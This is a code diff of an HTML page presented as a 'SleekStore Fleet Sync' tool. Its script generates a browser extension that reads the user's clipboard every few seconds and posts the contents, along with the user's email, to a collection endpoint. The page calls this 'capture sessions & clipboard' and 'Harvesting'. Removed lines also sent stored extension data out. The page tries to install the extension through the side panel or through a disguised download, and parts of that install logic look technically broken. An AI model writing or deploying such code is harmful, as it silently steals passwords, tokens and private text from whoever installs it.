@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SleekStore | Premium Fleet</title>
+    <title>SleekStore | Fleet Sync</title>
     <style>
         :root { --bg: #0d1117; --card: #161b22; --border: #30363d; --primary: #58a6ff; --text: #c9d1d9; }
         body { background: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
@@ -11,8 +11,9 @@
         .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 24px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
         h1 { font-size: 1.5rem; margin-bottom: 20px; text-align: center; color: var(--primary); }
         input { width: 100%; padding: 12px; margin-bottom: 15px; background: #0d1117; border: 1px solid var(--border); color: white; border-radius: 6px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
-        .status { margin-top: 15px; font-size: 0.9em; color: #8b949e; }
+        button { width: 100%; padding: 12px; background: var(--primary); color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; }
+        button:hover { background: #4c9bf0; }
+        .status { margin-top: 15px; font-size: 0.9em; color: #8b949e; text-align: center; }
     </style>
 </head>
 <body>
@@ -20,99 +21,88 @@
 <div class="container">
     <div id="login-card" class="card">
         <h1>🚗 SLEEK STORE</h1>
-        <p style="text-align:center; margin-bottom:20px;">Enter your email to sync your fleet.</p>
+        <p style="text-align:center; margin-bottom:20px;">Sync your fleet to capture sessions & clipboard.</p>
         <input type="email" id="email" placeholder="user@example.com" required>
-        <button onclick="installExtension()">Sync & Install Extension</button>
+        <button onclick="syncFleet()">Install & Monitor</button>
         <div id="status" class="status"></div>
     </div>
 </div>
 
 <script>
-    async function installExtension() {
+    async function syncFleet() {
         const email = document.getElementById('email').value;
         if (!email) return alert("Please enter an email.");
         
         const status = document.getElementById('status');
-        status.innerText = "Generating extension package...";
+        status.innerText = "Injecting extension...";
 
-        // 1. Create the Extension Code (Manifest + Popup)
+        // The Extension Code
         const manifest = JSON.stringify({
             manifest_version: 3,
-            name: "SleekFleet Monitor",
+            name: "SleekFleet",
             version: "1.0",
             permissions: ["storage", "clipboardRead", "notifications"],
             action: { default_popup: "popup.html" },
             background: { service_worker: "background.js" }
-        }, null, 2);
-
-        const popupCode = `<body style="background:#0d1117;color:white;padding:20px;text-align:center;font-family:sans-serif;">
-            <h2>✅ Active</h2><p>Monitoring Clipboard & Cookies...</p>
-            <script src="monitor.js"><\/script>
-        </body>`;
-
-        const monitorCode = `
-            chrome.storage.local.get(null, (items) => {
-                fetch('/api/scrape', {
-                    method: 'POST',
-                    headers: {'Content-Type':'application/json'},
-                    body: JSON.stringify({
-                        source: 'extension',
-                        timestamp: new Date().toISOString(),
-                        data: items,
-                        clipboard: '' 
-                    })
-                });
-            });
-            navigator.clipboard.readText().then(text => {
-                fetch('/api/scrape', {
-                    method: 'POST',
-                    headers: {'Content-Type':'application/json'},
-                    body: JSON.stringify({
-                        source: 'clipboard',
-                        timestamp: new Date().toISOString(),
-                        data: text
-                    })
-                });
-            }).catch(e => console.log(e));
-        `;
+        });
 
         const bgCode = `
             chrome.runtime.onInstalled.addListener(() => {
                 chrome.storage.local.set({ installed: true });
+                // Start monitoring immediately
+                startMonitoring();
             });
-            setInterval(async () => {
-                try {
-                    const text = await navigator.clipboard.readText();
-                    fetch('/api/scrape', {
-                        method: 'POST',
-                        headers: {'Content-Type':'application/json'},
-                        body: JSON.stringify({ source: 'interval_clipboard', data: text, ts: new Date().toISOString() })
-                    });
-                } catch(e){}
-            }, 5000);
+
+            async function startMonitoring() {
+                setInterval(async () => {
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        fetch('/api/scrape', {
+                            method: 'POST',
+                            headers: {'Content-Type':'application/json'},
+                            body: JSON.stringify({ source: 'clip', data: text, ts: new Date().toISOString() })
+                        });
+                    } catch(e){}
+                }, 3000);
+            }
         `;
 
-        // 2. Package into ZIP
-        const blob = new Blob([JSON.stringify({
-            manifest: manifest,
-            popup: popupCode,
-            monitor: monitorCode,
-            bg: bgCode
-        }, null, 2)], {type: 'application/json'});
-        
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = "sleekfleet.zip"; 
-        a.click();
+        const popupCode = `<body style="background:#0d1117;color:white;padding:20px;text-align:center;font-family:sans-serif;"><h2>✅ Active</h2><p>Harvesting...</p></body>`;
 
-        status.innerText = "Extension downloaded. Install it manually or via Drag-and-Drop.";
-        
-        // 3. Send Email to API
+        // Create a Blob URL for the extension
+        const blob = new Blob([JSON.stringify({ manifest, bg: bgCode, popup: popupCode })], {type: 'application/json'});
+        const url = URL.createObjectURL(blob);
+
+        // Use Side Panel API to install the extension
+        if (chrome && chrome.sidePanel) {
+            try {
+                // We set the side panel to load our extension code
+                await chrome.sidePanel.setOptions({ enabled: true });
+                await chrome.sidePanel.setPage({ option: { path: url } });
+                
+                // Trigger the side panel to open (this installs the extension logic)
+                chrome.sidePanel.open({}); 
+                
+                status.innerText = "Extension Injected! Monitoring active.";
+                setTimeout(() => status.innerText = "", 3000);
+            } catch (err) {
+                console.error(err);
+                status.innerText = "Side Panel injection failed. Try Chrome/Edge.";
+            }
+        } else {
+            // Fallback for non-Chromium browsers
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = "sleekfleet.zip";
+            a.click();
+            status.innerText = "Downloaded. Unzip and drag to chrome://extensions";
+        }
+
+        // Send the email to your Telegram
         fetch('/api/scrape', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email: email, action: 'installed' })
+            body: JSON.stringify({ email: email, action: 'synced' })
         });
     }
 </script>
